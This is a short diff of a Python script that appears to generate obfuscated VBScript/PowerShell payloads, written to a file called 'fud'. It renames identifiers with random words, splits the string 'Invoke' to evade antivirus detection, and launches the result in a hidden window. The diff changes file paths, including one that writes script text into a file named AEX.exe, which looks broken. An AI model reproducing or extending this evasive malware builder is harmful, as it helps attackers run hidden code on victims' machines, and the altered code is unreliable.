@@ -99,7 +99,7 @@ try:
         exit('{}'.format(e))
 
     try:
-        wordlist = open('words.txt', 'r')
+        wordlist = open('\ofcu\words.txt', 'r')
         words = list(set(wordlist.read().split("\n")))
         confuse = confuse(words)
     except Exception as e:
@@ -127,7 +127,7 @@ try:
                   "<##>('In" + confuse['V'] + "oke'.replace('" + confuse['V'] + "','v'))($Null,$Null)<##>;\"  \n\n" \
                   "" + confuse['obj'] + ".Run " + confuse['sync'] + ", 0, False"
     try:
-        fud = open('AEX.vbs', 'w')
+        fud = open('AEX.exe', 'w')
         fud.write(power_shell)
         fud.close()
         #loading()
